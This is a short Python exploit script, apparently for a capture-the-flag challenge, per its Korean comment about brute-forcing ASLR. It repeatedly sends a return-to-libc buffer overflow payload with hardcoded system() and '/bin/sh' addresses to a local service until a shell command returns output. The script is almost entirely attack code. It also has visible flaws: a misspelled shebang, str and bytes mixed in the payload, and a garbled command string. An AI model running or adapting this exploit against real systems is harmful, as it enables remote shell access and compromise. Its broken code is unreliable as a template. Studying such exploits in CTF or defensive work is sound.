#!/usr/bin/env pytohn
#-*- coding: utf-8 -*-
'''
    python ==> CTF, ASLR 방어 시스템을 브루트포스 방식을 사용해 공격하는 코드
                    리눅스전용
'''
import socket
import time
import os
import sys
import struct
import telnetlib

def connect(ip, port):
	return socket.create_connection((ip,port))

def p(x):
	return struct.pack('<I',x)

def u(x):
	return struct.unpack('<I',x)[0]


def interact(s):
	print('----- interactive mode ------')
	t = telnetlib.Telnet()
	t.sock = s
	t.interact()

payload = 'A' * 43
payload += p(0x757f940) # system
payload += b'BBBB'
payload += p(0x769de8b) # /bin/sh

while True:
	s = connect('127.0.0.1', 80)

	print(s.recv(1024).decode('utf-8'))

	s.send(payload + b'\n')
	time.sleep(0.1)
	s.send('id\n\exit\n')
	time.sleep(0.1)

	result = s.recv(1024).decode('utf-8')

	if len(result):
		print(result)
		break
